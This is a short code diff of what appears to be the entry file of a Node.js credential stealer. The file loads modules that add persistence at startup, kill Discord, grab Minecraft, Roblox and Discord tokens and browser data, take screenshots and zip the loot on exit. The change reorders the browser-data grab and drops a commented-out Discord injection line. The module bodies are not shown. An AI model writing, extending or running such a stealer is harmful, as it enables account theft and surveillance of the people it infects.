@@ -11,11 +11,9 @@ config.addToStartup && require('./functions/startup');
 config.killDiscord  && require('./functions/kill-discord');
 require('./functions/grab-mc');
 require('./functions/grab-roblox');
-require('./functions/grab-browsers-data');
 require('./functions/grab-discord-token');
+require('./functions/grab-browsers-data');
 require('./functions/screenshot');
 // require('./functions/fake-error');
-
-// require('./functions/discord-injection');
 
 process.on('beforeExit', () => require('./functions/zip'));
